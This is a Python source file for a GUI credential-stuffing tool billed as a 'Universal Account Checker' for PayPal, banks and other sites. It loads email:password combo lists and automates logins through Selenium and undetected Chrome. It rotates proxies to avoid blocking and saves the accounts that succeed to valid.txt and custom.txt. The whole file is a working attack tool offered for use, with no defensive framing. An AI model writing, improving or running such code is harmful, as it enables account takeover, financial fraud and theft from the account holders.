import subprocess
import sys
import platform
import tkinter as tk
from tkinter import ttk
import os
import time
import requests
import sqlite3
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.action_chains import ActionChains
import colorama
from colorama import Fore, Style
import re
from tkinter import filedialog
import random
from undetected_chromedriver import Chrome  # Import undetected_chromedriver
import threading  # Import threading for background tasks
import getpass  # Import getpass for getting the user name

colorama.init()  # Initialize colorama for colored output

# --- Update Pip ---

try:
    subprocess.check_call(["python.exe", "-m", "pip", "install", "--upgrade", "pip", "--no-warning"])
    print("Pip upgraded successfully.")
except subprocess.CalledProcessError:
    print("Pip already up-to-date.")

# --- Python Version Check ---

def check_python_version():
    """
    Checks if Python 3.11.8 is installed.
    If not, prompts the user to download it.
    """
    python_version = platform.python_version()
    if python_version != "3.11.8":
        print(f"Python 3.11.8 is required. You have {python_version} installed.")
        print("Please download Python 3.11.8 from:")
        print("https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe")
        sys.exit(1)

# --- Force Close Chrome Processes ---

def force_close_chrome_processes():
    """Force closes all running Chrome.exe processes."""
    print_action("Force closing existing Chrome processes...")
    try:
        subprocess.run(["taskkill", "/f", "/im", "chrome.exe"], check=True)
        print_action("Chrome processes closed successfully.")
    except subprocess.CalledProcessError as e:
        print_action(f"Error closing Chrome processes: {e}")

# --- Package Installation ---

def install_or_upgrade_package(package_name):
    """
    Attempts to install or upgrade a package using pip.
    If installation fails, it tries to upgrade the package.

    Args:
        package_name (str): The name of the package to install or upgrade.
    """
    try:
        subprocess.check_call(["pip", "install", package_name])
        print(f"{package_name} package installed successfully.")
    except subprocess.CalledProcessError:
        try:
            subprocess.check_call(["pip", "install", "--upgrade", package_name])
            print(f"{package_name} package upgraded successfully.")
        except subprocess.CalledProcessError:
            pass


def check_package_installed_upgraded(package_name):
    """
    Checks if a package is installed and up-to-date.
    If not, it attempts to install or upgrade the package.

    Args:
        package_name (str): The name of the package to check.
    """
    try:
        output = subprocess.check_output(["pip", "show", package_name]).decode("utf-8")
        name_line = output.splitlines()[0]
        version_line = output.splitlines()[1]
        print(f"{name_line}\n{version_line}")
    except subprocess.CalledProcessError:
        install_or_upgrade_package(package_name)


# --- Database Setup ---

def setup_database(db_name):
    conn = sqlite3.connect(db_name)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS accounts (email text, password text, checked integer)''')
    conn.commit()
    conn.close()


# --- Browser Functions ---

def open_browser(chrome_exe_path, options=None):
    options = options or webdriver.ChromeOptions()
    options.binary = chrome_exe_path
    options.add_argument(f"user-data-dir={user_data_dir}") 
    options.add_argument(f"--profile-directory={profile_name}")  # Select the profile from Thinker GUI
    browser = webdriver.Chrome(service=Service(os.path.join(os.getcwd(), "chromedriver.exe")), options=options)
    return browser

def open_seleniumwire_browser(chrome_exe_path, options=None):
    webdriver_seleniumwire.DesiredCapabilities.CHROME['acceptInsecureCerts'] = True
    options = options or webdriver_seleniumwire.ChromeOptions()
    options.binary = chrome_exe_path
    options.add_argument(f"user-data-dir={user_data_dir}")
    options.add_argument(f"--profile-directory={profile_name}")  # Select the profile from Thinker GUI
    browser = webdriver_seleniumwire.Chrome(service=Service(os.path.join(os.getcwd(), "chromedriver.exe")), options=options)
    return browser

def open_undetected_browser(options=None):
    options = options or webdriver.ChromeOptions()
    options.binary = chrome_exe_path
    options.add_argument(f"user-data-dir={user_data_dir}")
    options.add_argument("--profile-directory=Default")
    options.add_argument(f"--profile-directory={profile_name}")  # Select the profile from Thinker GUI
    browser = Chrome(options=options)
    return browser

def close_browser(browser):
    browser.quit()

# --- Account Checking Logic ---

def check_account(account, browser, website_link, valid_link, db_name, custom_valid_link, proxy_address, proxy_port, proxy_enabled):
    if len(account) < 2:
        print(f"Invalid account format: {account}")
        return

    if account.count(":") > 1:
        print(f"Account {account[0]} has more than one colon, skipping.")
        return

    print_action("Opening website...")
    browser.get(website_link)

    delay = 15 / (speed_percentage + 1)
    countdown_sleep(delay)

    print_action("Finding email field...")
    try:
        WebDriverWait(browser, 300).until(EC.presence_of_element_located((By.CSS_SELECTOR, css_selector_email)))
    except:
        print(f"Email field not found, skipping account {account[0]}")
        return

    delay = 15 / (speed_percentage + 1)
    countdown_sleep(delay)

    print_action("Entering email...")
    # Enter Email
    email_field = browser.find_element(By.CSS_SELECTOR, css_selector_email)
    email_field.send_keys(account[0])

    # Check for Next button ONLY if the CSS selector is provided
    if css_selector_next_button:
        print_action("Finding Next button...")
        try:
            WebDriverWait(browser, 300).until(EC.presence_of_element_located((By.CSS_SELECTOR, css_selector_next_button)))
        except:
            print(f"Next button not found, skipping account {account[0]}")
            return

        delay = 15 / (speed_percentage + 1)
        countdown_sleep(delay)

        print_action("Clicking Next button...")
        # Click Next Button
        next_button = browser.find_element(By.CSS_SELECTOR, css_selector_next_button)
        next_button.click()

        delay = 15 / (speed_percentage + 1)
        countdown_sleep(delay)

    print_action("Finding password field...")
    try:
        WebDriverWait(browser, 300).until(EC.presence_of_element_located((By.CSS_SELECTOR, css_selector_password)))
    except:
        print(f"Password field not found, skipping account {account[0]}")
        return

    delay = 15 / (speed_percentage + 1)
    countdown_sleep(delay)

    print_action("Finding submit button...")
    try:
        WebDriverWait(browser, 300).until(EC.element_to_be_clickable((By.CSS_SELECTOR, css_selector_submit)))
    except:
        print(f"Submit button not clickable, skipping account {account[0]}")
        return

    print_action("Entering password...")
    # Enter Password
    password_field = browser.find_element(By.CSS_SELECTOR, css_selector_password)
    password_field.send_keys(account[1])

    print_action("Clicking submit button...")
    # Click Submit Button
    submit_button = browser.find_element(By.CSS_SELECTOR, css_selector_submit)
    submit_button.click()

    delay = 5 / (speed_percentage + 1)
    countdown_sleep(delay)

    print_checkpoint(delay)

    delay = 150 / (speed_percentage + 1)
    countdown_sleep(delay)

    print_action("Checking for valid link...")
    # Check for valid link with wildcard matching
    if custom_valid_link:
        # Split the custom valid link at the '*'
        custom_valid_link_prefix = custom_valid_link.split("*")[0]
        
        # Check if the browser's URL starts with the prefix
        if browser.current_url.startswith(custom_valid_link_prefix):
            print(f"Valid Account (custom): {account[0]}, password: {account[1]}")
            mark_account_checked(account, db_name)
            with open("custom.txt", "a") as f:
                f.write(f"{account[0]}:{account[1]}\n")
            return
        else:
            print(f"Invalid Account: {account[0]}, password: {account[1]}")
    elif valid_link:  # Check for standard valid link if provided
        # Split the valid link at the '*'
        valid_link_prefix = valid_link.split("*")[0]
        
        # Check if the browser's URL starts with the prefix
        if browser.current_url.startswith(valid_link_prefix):
            print(f"Valid Account: {account[0]}, password: {account[1]}")
            mark_account_checked(account, db_name)
            with open("valid.txt", "a") as f:
                f.write(f"{account[0]}:{account[1]}\n")
            return
        else:
            print(f"Invalid Account: {account[0]}, password: {account[1]}")
    else:
        print(f"Invalid Account: {account[0]}, password: {account[1]}")  # Account is invalid if no valid link is provided

    delay = 5 / (speed_percentage + 1)
    countdown_sleep(delay)


def check_accounts_logic(accounts, browser, website_link, valid_link, db_name, custom_valid_link, proxy_address=None, proxy_port=None, proxy_enabled=False):
    found_valid_account = False

    for index, account in enumerate(accounts):
        print(f"Checking account {index + 1}/{len(accounts)}")

        # Define 'options' outside the if block
        options = webdriver.ChromeOptions() 

        # Rotate the proxy for each account
        if proxy_enabled:
            # Select a random proxy from the list
            proxy_address, proxy_port = random.choice(proxies)
            # Update the proxy settings
            options.add_argument("user-data-dir=" + user_data_dir)
            options.add_argument("--profile-directory=Profile 1")
            options.add_argument("--start-maximized")
            options.add_argument(f'--proxy-server={proxy_address}')

        close_browser(browser)
        chrome_exe_path = os.path.abspath(r"C:\Program Files\Google\Chrome\Application\chrome.exe")
        browser = open_browser(chrome_exe_path, options)  # Pass 'options' to open_browser

        check_account(account, browser, website_link, valid_link, db_name, custom_valid_link, proxy_address, proxy_port, proxy_enabled)

        # Calculate delay based on speed percentage
        delay = 10 / (speed_percentage + 1)  # Divide by (speed + 1) for faster speed
        countdown_sleep(delay)  # Add a delay to allow the website to load

        # Check for valid link with wildcard matching
        if custom_valid_link and custom_valid_link.strip().lower() in browser.current_url.strip().lower():
            print(f"Valid Account (custom): {account[0]}, password: {account[1]}")
            mark_account_checked(account, db_name)
            with open("custom.txt", "a") as f:
                f.write(f"{account[0]}:{account[1]}\n")
        elif valid_link and valid_link.strip().lower() in browser.current_url.strip().lower():
            print(f"Valid Account: {account[0]}, password: {account[1]}")
            mark_account_checked(account, db_name)
            with open("valid.txt", "a") as f:
                f.write(f"{account[0]}:{account[1]}\n")
        else:
            print(f"Invalid Account: {account[0]}, password: {account[1]}")

        time.sleep(2)

# --- Database Helper Functions ---

def account_already_checked(account, db_name):
    conn = sqlite3.connect(db_name)
    cursor = conn.cursor()
    cursor.execute("SELECT checked FROM accounts WHERE email=? AND password=?", (account[0], account[1]))
    result = cursor.fetchone()
    conn.close()
    if result is not None:
        return result[0] == 1
    else:
        return False


def mark_account_checked(account, db_name):
    conn = sqlite3.connect(db_name)
    cursor = conn.cursor()
    cursor.execute("UPDATE accounts SET checked=1 WHERE email=? AND password=?", (account[0], account[1]))
    conn.commit()
    conn.close()


# --- GUI Functions ---

def gui_check_accounts():
    global css_selector_email, css_selector_password, css_selector_submit, speed_percentage, use_same_session, website_target_link, website_valid_link, css_selector_next_button, custom_valid_link, proxy_address, proxy_port, proxy_enabled

    website_target_link = entry_target_link.get()
    website_valid_link = entry_valid_link.get()
    css_selector_email = entry_css_selector_email.get()
    css_selector_password = entry_css_selector_password.get()
    css_selector_submit = entry_css_selector_submit.get()
    css_selector_next_button = entry_css_selector_next_button.get()
    speed_percentage = float(entry_speed.get()) / 100
    use_same_session = var_same_session.get()
    custom_valid_link = entry_custom_valid_link.get()
    proxy_enabled = var_proxy_enabled.get()

    usernames_and_passwords = []
    for line in text_usernames_passwords.get("1.0", tk.END).split("\n"):
        if line:
            account = line.strip().split(":")
            if len(account) == 2:
                usernames_and_passwords.append(account)

    # If proxy is enabled, use undetected_chromedriver
    if proxy_enabled:
        # Create a new thread for account checking
        def check_accounts_thread():
            global browser
            browser = open_undetected_browser(options=None)
            check_accounts_logic(usernames_and_passwords, browser, website_target_link, website_valid_link, db_name, custom_valid_link, proxy_enabled=proxy_enabled)
            close_browser(browser)

        thread = threading.Thread(target=check_accounts_thread)
        thread.start()
    else:
        # Use regular selenium for account checking
        browser = open_browser(chrome_exe_path, options=None)  # Define browser here
        check_accounts_logic(usernames_and_passwords, browser, website_target_link, website_valid_link, db_name, custom_valid_link, proxy_enabled=proxy_enabled)
        close_browser(browser)

def import_proxies_from_file():
    global proxies  # Use the global list 'proxies'
    file_path = filedialog.askopenfilename(initialdir=os.getcwd(), title="Select Proxy File", filetypes=(("Text Files", "*.txt"),))
    if file_path:
        with open(file_path, 'r') as file:
            proxies = []  # Clear the previous proxies
            for line in file:
                proxy_line = line.strip()
                parts = proxy_line.split(':')  # Split by ':' to separate login, pass, ip, and port
                if len(parts) == 4:
                    # The format is login:pass@ip:port
                    login, pass_part, ip, port = parts
                    proxy_address = f"{ip}:{port}"  # Combine ip and port for proxy address
                    proxies.append((proxy_address, port))  # Add to the list of proxies
                    print(f"Proxy imported: {proxy_address}")
                else:
                    print("Invalid proxy format in the file.")
            if proxies:
                print("Proxies imported successfully.")
            else:
                print("No valid proxies found in the file.")

def print_action(action_text):
    """Prints the action text in blue."""
    print(f"{Fore.BLUE}{action_text}{Style.RESET_ALL}")

def print_checkpoint(delay):
    """Prints a blue checkpoint message with the delay."""
    print(f"{Fore.BLUE}Checkpoint: Delaying for {delay:.2f} seconds{Style.RESET_ALL}")

def countdown_sleep(seconds):
    """Counts down the sleep time and prints it in green."""
    print(f"{Fore.GREEN}Sleeping for: {seconds:.2f} seconds{Style.RESET_ALL}")
    for i in range(int(seconds), 0, -1):
        if i == int(seconds) / 2:  # Check for 150 seconds
            print(f"{Fore.YELLOW}150 seconds have passed, try and check if you copied the correct CSS Selector. When 300 seconds have passed, the script will end automatically.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Time remaining: {i} seconds{Style.RESET_ALL}", end="\r")
        time.sleep(1)
    print(f"{Fore.GREEN}Sleep completed!{Style.RESET_ALL}")

def create_config():
    """Opens a window for creating a new config file."""
    global config_file_path

    def save_config():
        global config_file_path
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=(("Text Files", "*.txt"),))
        if file_path:
            config_file_path = file_path
            config_window.destroy()
            print_action(f"Config file created at: {file_path}")
            save_config_data(config_file_path)  # Save the config data to the file

    config_window = tk.Toplevel(window)
    config_window.title("Create New Config")

    ttk.Label(config_window, text="Enter a name for the new config file (e.g., 'my_config.txt'):").pack(pady=10)

    entry_config_name = ttk.Entry(config_window, width=40)
    entry_config_name.pack(pady=10)

    ttk.Button(config_window, text="Save Config", command=save_config).pack()

def import_config():
    """Opens a window for importing an existing config file."""
    global config_file_path
    file_path = filedialog.askopenfilename(initialdir=os.getcwd(), title="Import Config", filetypes=(("Text Files", "*.txt"),))
    if file_path:
        config_file_path = file_path
        load_config_data(config_file_path, entry_target_link, entry_valid_link, entry_css_selector_email, entry_css_selector_password, entry_css_selector_submit, entry_css_selector_next_button, entry_speed, entry_custom_valid_link)
        print_action(f"Config file imported from: {file_path}")

def export_config():
    """Opens a window for exporting the current config file."""
    global config_file_path
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=(("Text Files", "*.txt"),))
    if file_path:
        config_file_path = file_path
        save_config_data(config_file_path)
        print_action(f"Config file exported to: {file_path}")

def save_config_state():
    """Saves the current state of the config to a file."""
    global config_file_path

    if not config_file_path:
        create_config()  # Prompt user to create a config file if none exists

    if config_file_path:
        save_config_data(config_file_path)
        print_action(f"Config state saved to: {config_file_path}")

def load_config_data(file_path, entry_target_link, entry_valid_link, entry_css_selector_email, entry_css_selector_password, entry_css_selector_submit, entry_css_selector_next_button, entry_speed, entry_custom_valid_link):
    """Loads config data from a file."""
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
            for line in lines:
                parts = line.strip().split("=")
                if len(parts) == 2:  # Ensure each line has key=value format
                    key, value = parts
                    if key == "website_target_link":
                        entry_target_link.delete(0, tk.END)
                        entry_target_link.insert(0, value)
                    elif key == "website_valid_link":
                        entry_valid_link.delete(0, tk.END)
                        entry_valid_link.insert(0, value)
                    elif key == "css_selector_email":
                        entry_css_selector_email.delete(0, tk.END)
                        entry_css_selector_email.insert(0, value)
                    elif key == "css_selector_password":
                        entry_css_selector_password.delete(0, tk.END)
                        entry_css_selector_password.insert(0, value)
                    elif key == "css_selector_submit":
                        entry_css_selector_submit.delete(0, tk.END)
                        entry_css_selector_submit.insert(0, value)
                    elif key == "css_selector_next_button":
                        entry_css_selector_next_button.delete(0, tk.END)
                        entry_css_selector_next_button.insert(0, value)
                    elif key == "speed_percentage":
                        entry_speed.delete(0, tk.END)
                        entry_speed.insert(0, value)
                    elif key == "custom_valid_link":
                        entry_custom_valid_link.delete(0, tk.END)
                        entry_custom_valid_link.insert(0, value)
    except FileNotFoundError:
        print_action(f"Config file not found: {file_path}")
    except ValueError:
        print_action(f"Error loading config file: {file_path}. Make sure it's in the correct format (key=value).")

def save_config_data(file_path):
    """Saves config data to a file."""
    with open(file_path, 'w') as file:
        file.write(f"website_target_link={entry_target_link.get()}\n")
        file.write(f"website_valid_link={entry_valid_link.get()}\n")
        file.write(f"css_selector_email={entry_css_selector_email.get()}\n")
        file.write(f"css_selector_password={entry_css_selector_password.get()}\n")
        file.write(f"css_selector_submit={entry_css_selector_submit.get()}\n")
        file.write(f"css_selector_next_button={entry_css_selector_next_button.get()}\n")
        file.write(f"speed_percentage={entry_speed.get()}\n")
        file.write(f"custom_valid_link={entry_custom_valid_link.get()}\n")

def reset_to_default():
    """Resets all GUI entries to their default values."""
    entry_target_link.delete(0, tk.END)
    entry_valid_link.delete(0, tk.END)
    entry_css_selector_email.delete(0, tk.END)
    entry_css_selector_password.delete(0, tk.END)
    entry_css_selector_submit.delete(0, tk.END)
    entry_css_selector_next_button.delete(0, tk.END)
    entry_speed.delete(0, tk.END)
    entry_speed.insert(0, "500")
    entry_custom_valid_link.delete(0, tk.END)

# --- Function to Select Chrome Profile ---
def select_profile():
    """Opens a window for selecting a Chrome profile."""
    global profile_name

    def choose_profile():
        """Handles profile selection and closes the window."""
        global profile_name
        profile_name = profile_list.get(tk.ANCHOR)
        profile_window.destroy()

    profile_window = tk.Toplevel()  # Create a new Toplevel window, not a child of 'window'
    profile_window.title("Select Chrome Profile")

    profile_list = tk.Listbox(profile_window, width=50)
    profile_list.pack(pady=10)

    # Add available profiles from the User Data directory
    for profile in os.listdir(user_data_dir):
        if os.path.isdir(os.path.join(user_data_dir, profile)) and profile.startswith("Profile "):
            profile_list.insert(tk.END, profile)

    ttk.Button(profile_window, text="Select Profile", command=choose_profile).pack()

    # Wait for the profile selection window to be closed
    profile_window.wait_window()  # This will block the execution until the profile window is closed

# --- Main GUI ---

# Initialize the GUI
window = tk.Tk()
window.title("HOFNAR05 - Universal Account Checker | BUILDER | MODERN MODE v1.6.2 - Paypel, Bank, other modern sites")
window.geometry("700x800")

# Styling
style = ttk.Style()
style.theme_use("clam")
style.configure("TButton", font=("Helvetica", 10, "bold"), padding=(10, 2, 10, 2))
style.configure("TLabel", font=("Helvetica", 10))
style.map("TButton",
          foreground=[('active', '!disabled', 'white'), ('active', 'disabled', 'yellow')],
          background=[('active', '!disabled', '#00703C'), ('active', 'disabled', '#00703C')])

# Widgets
frame = ttk.Labelframe(window, text="Settings")
frame.grid(column=0, row=0, padx=10, pady=10, sticky="w")

entry_target_link = ttk.Entry(frame, width=50)
entry_target_link.grid(column=1, row=0, padx=(0, 10), pady=(0, 5))
ttk.Label(frame, text="Website Target Link:").grid(column=0, row=0, padx=(10, 0), pady=(0, 5))

entry_valid_link = ttk.Entry(frame, width=50)
entry_valid_link.grid(column=1, row=1, padx=(0, 10), pady=(0, 5))
ttk.Label(frame, text="Website Valid Link (Optional):").grid(column=0, row=1, padx=(10, 0), pady=(0, 5))

# *** Website Valid Link:
# The Website Valid Link is optional. If provided, the script will check if the current URL matches the provided link after login. This can be useful for verifying accounts that require 2FA.
# The link can contain a wildcard symbol * which acts as a delimiter. Anything after the * symbol will be considered a variable part of the link. The script will use regular expressions to match this wildcard, making the link flexible and able to match different variations.
# For example, if you provide the following Website Valid Link:
# https://www.example.com/verify?token=*
# The script will match any link that starts with https://www.example.com/verify?token= and has any value after the equals sign.
# This is useful for scenarios where the token changes dynamically after login.

entry_custom_valid_link = ttk.Entry(frame, width=50)
entry_custom_valid_link.grid(column=1, row=7, padx=(0, 10), pady=(0, 5))
ttk.Label(frame, text="2FA Valid Link (Optional):").grid(column=0, row=7, padx=(10, 0), pady=(0, 5))

# *** 2FA Valid Link:
# The 2FA Valid Link is optional. If provided, the script will check if the current URL matches the provided link after login. This can be useful for verifying accounts that require 2FA.
# The link can contain a wildcard symbol * which acts as a delimiter. Anything after the * symbol will be considered a variable part of the link. The script will use regular expressions to match this wildcard, making the link flexible and able to match different variations.
# For example, if you provide the following 2FA Valid Link:
# https://www.example.com/verify?token=*
# The script will match any link that starts with https://www.example.com/verify?token= and has any value after the equals sign.
# This is useful for scenarios where the token changes dynamically after login.

entry_css_selector_email = ttk.Entry(frame, width=50)
entry_css_selector_email.grid(column=1, row=2, padx=(0, 10), pady=(0, 5))
ttk.Label(frame, text="CSS Selector for Email / Username:").grid(column=0, row=2, padx=(10, 0), pady=(0, 5))

entry_css_selector_password = ttk.Entry(frame, width=50)
entry_css_selector_password.grid(column=1, row=3, padx=(0, 10), pady=(0, 5))
ttk.Label(frame, text="CSS Selector for Password:").grid(column=0, row=3, padx=(10, 0), pady=(0, 5))

entry_css_selector_submit = ttk.Entry(frame, width=50)
entry_css_selector_submit.grid(column=1, row=4, padx=(0, 10), pady=(0, 5))
ttk.Label(frame, text="CSS Selector for Submit / Login Button:").grid(column=0, row=4, padx=(10, 0), pady=(0, 5))

entry_css_selector_next_button = ttk.Entry(frame, width=50)
entry_css_selector_next_button.grid(column=1, row=5, padx=(0, 10), pady=(0, 5))
ttk.Label(frame, text="CSS Selector for Next Button (Optional):").grid(column=0, row=5, padx=(10, 0), pady=(0, 5))

entry_speed = ttk.Entry(frame, width=5)
entry_speed.insert(0, "500")  # Default speed set to 500
entry_speed.grid(column=1, row=6, padx=(0, 10), pady=(0, 5))
ttk.Label(frame, text="Speed % (0-1000) Default Mode = set value to 500:").grid(column=0, row=6, padx=(10, 0), pady=(0, 5))

var_same_session = tk.BooleanVar()
var_same_session.set(False)

text_usernames_passwords = tk.Text(window, height=10)
text_usernames_passwords.grid(column=0, row=1, padx=10, pady=(10, 10), sticky="w")

ttk.Button(window, text="Check Accounts", command=gui_check_accounts).grid(column=0, row=2, padx=(10, 0), pady=(10, 10), sticky="w")
# Proxy Settings

proxy_frame = ttk.Labelframe(window, text="Proxy Settings")
proxy_frame.grid(column=0, row=3, padx=10, pady=(10, 10), sticky="w")

var_proxy_enabled = tk.BooleanVar()
ttk.Checkbutton(proxy_frame, text="Enable Proxy", variable=var_proxy_enabled).grid(column=0, row=2, columnspan=2, padx=(10, 0), pady=(0, 5))

ttk.Button(proxy_frame, text="Import Proxies from File", command=import_proxies_from_file).grid(column=0, row=3, columnspan=2, padx=(10, 0), pady=(0, 5))
# --- Config Menu ---

config_menu_frame = ttk.Labelframe(window, text="Config Menu")
config_menu_frame.grid(column=0, row=4, padx=10, pady=(10, 10), sticky="w")

ttk.Button(config_menu_frame, text="Create New Config", command=create_config).grid(column=0, row=0, padx=(10, 0), pady=(0, 5))
ttk.Button(config_menu_frame, text="Import Config", command=import_config).grid(column=0, row=1, padx=(10, 0), pady=(0, 5))
ttk.Button(config_menu_frame, text="Export Config", command=export_config).grid(column=0, row=2, padx=(10, 0), pady=(0, 5))
ttk.Button(config_menu_frame, text="Save Config State", command=save_config_state).grid(column=0, row=3, padx=(10, 0), pady=(0, 5))
ttk.Button(config_menu_frame, text="Reset to Default", command=reset_to_default).grid(column=0, row=4, padx=(10, 0), pady=(0, 5))

# --- Initialization ---

# Initialize database
db_name = "checked_accounts.db"
setup_database(db_name)

# Check if Python 3.11.8 is installed
check_python_version()

# Check and install/upgrade required packages
check_package_installed_upgraded("colorama")
check_package_installed_upgraded("tk")
check_package_installed_upgraded("selenium")
check_package_installed_upgraded("webdriver-manager")
check_package_installed_upgraded("requests")
check_package_installed_upgraded("undetected-chromedriver")

# Get the current user's name
current_user = getpass.getuser()

# Define the path to the Chrome executable and user data directory
chrome_exe_path = os.path.abspath(r"C:\Program Files\Google\Chrome\Application\chrome.exe")
user_data_dir = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")

# --- Function to Select Chrome Profile ---
# Move this function outside the main loop 
def select_profile():
    """Opens a window for selecting a Chrome profile."""
    global profile_name

    def choose_profile():
        """Handles profile selection and closes the window."""
        global profile_name
        profile_name = profile_list.get(tk.ANCHOR)
        profile_window.destroy()

    profile_window = tk.Toplevel()  # Create a new Toplevel window, not a child of 'window'
    profile_window.title("Select Chrome Profile")

    profile_list = tk.Listbox(profile_window, width=50)
    profile_list.pack(pady=10)

    # Add available profiles from the User Data directory
    for profile in os.listdir(user_data_dir):
        if os.path.isdir(os.path.join(user_data_dir, profile)) and profile.startswith("Profile "):
            profile_list.insert(tk.END, profile)

    ttk.Button(profile_window, text="Select Profile", command=choose_profile).pack()

    # Wait for the profile selection window to be closed
    profile_window.wait_window()  # This will block the execution until the profile window is closed

# --- Global variables for browser and other settings ---
browser = None  # Initialize browser to None
profile_name = ""  # Initialize profile_name to an empty string

# --- Select the profile before starting the main GUI loop ---
select_profile()  # Now this will be executed only once, before the main loop starts

# --- Start the main GUI loop ---
window.mainloop()

